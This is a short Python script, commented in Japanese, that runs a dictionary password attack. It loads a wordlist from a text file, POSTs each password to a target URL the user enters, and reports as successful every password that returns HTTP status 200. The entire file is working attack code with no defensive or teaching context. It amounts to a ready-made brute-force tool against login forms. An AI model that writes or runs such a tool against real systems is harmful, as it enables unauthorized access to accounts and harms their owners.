import requests

def load_wordlist_from_file(file_path):
    with open(file_path, 'r') as file:
        wordlist_from_file = [line.strip() for line in file.readlines()]
    return wordlist_from_file

def password_attack(url: str, file_path: str) -> list:
    # txtファイルからワードリストを読み込む
    passwords = load_wordlist_from_file(file_path)
    
    success_passwords = []
    
    for password in passwords:
        # データ送信の形に応じてリクエストを変更
        data = {'password': password}  # POSTデータの例
        
        response = requests.post(url, data=data)
        
        if response.status_code == 200:  # 成功とみなすステータスコード
            print(f"[+] パスワード成功: {password}")
            success_passwords.append(password)
        else:
            print(f"[-] 失敗: {password}")
    
    return success_passwords

if __name__ == "__main__":
    file_path = input("パスワードファイル名（例: example.txt）: ")
    url = input("ターゲットURL: ")
    results = password_attack(url, file_path)

    if results:
        print("成功したパスワード:", results)
    else:
        print("成功パスワードはありませんでした。")
